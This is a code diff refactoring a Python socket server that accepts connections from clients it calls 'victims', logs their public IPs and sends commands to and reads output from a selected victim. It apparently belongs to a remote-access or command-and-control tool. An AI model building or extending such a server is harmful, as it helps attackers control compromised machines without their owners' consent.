@@ -1,35 +1,31 @@
-import json
+import json, select, socket, hashlib
+from json import JSONDecodeError
 
-import select, socket, hashlib
-
-BUFSIZE: int = 8192
-ENCODING: str = 'cp866'
+from const import Const
+from victim import Victim
 
 
 class Server:
     def __init__(self, ip: str, port: int):
         self.ip = ip
         self.port = port
-        self.victims = {}
-        self.victim = None
+        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    def send_data(self, info_hash: str, data: str):
-        sock = self.victims[info_hash][0]
+        self.victims: list[Victim] = []
 
-        sock.send(data.encode(encoding=ENCODING))
+    def send_to_victim(self, index: int, data: str) -> None:
+        sock = self.victims[index].socket
+        sock.send(data.encode(encoding=Const.ENCODING))
 
-    def get_data(self, info_hash: str):
-        sock = self.victims[info_hash][0]
+    def get_from_victim(self, index: int) -> str:
+        sock = self.victims[index].socket
+        return sock.recv(Const.BUFSIZE).decode(encoding=Const.ENCODING)
 
-        while True:
-            try:
-                data = sock.recv(BUFSIZE).decode(encoding=ENCODING)
-                return data
-            except BlockingIOError:
-                continue
+    def stop(self) -> None:
+        self.server.close()
 
-    def start(self):
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
+    def start(self) -> None:
+        with self.server as server:
             server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             server.bind((self.ip, self.port))
             server.listen()
@@ -38,7 +34,7 @@ class Server:
 
             inputs = [server]
 
-            while True:
+            while self.server:
                 readable, _, _ = select.select(inputs, [], [])
 
                 for sock in readable:
@@ -47,23 +43,26 @@ class Server:
                         inputs.append(victim)
 
                     else:
-                        print(
-                            f'[+] Got connection')
+                        data: bytes = sock.recv(Const.BUFSIZE)
 
-                        data: bytes = sock.recv(BUFSIZE)
-
-                        if data:
-                            info_hash = hashlib.sha256(data).hexdigest()
-
-                            if info_hash in self.victims:
-                                pass
-
-                            else:
-                                print(
-                                    f'[+] Got connection from: {json.loads(data.decode(encoding=ENCODING))['victim']['public_ip']}')
-                                self.victims[info_hash] = [sock, data]
-
-                        else:
+                        if not data:
                             sock.close()
+                            inputs.remove(sock)
+                            continue
 
+                        info_hash: str = hashlib.sha256(data).hexdigest()
+
+                        if info_hash in self.victims:
+                            inputs.remove(sock)
+                            continue
+
+                        try:
+                            info: dict = json.loads(data.decode(encoding=Const.ENCODING))
+                            self.victims.append(Victim(info=info, sock=sock))
+                            print(f'[+] Got connection from: {info['public_ip']}')
+
+                        except JSONDecodeError:
+                            print('Can\'t decode json(')
+
+                        # sock.close()
                         inputs.remove(sock)
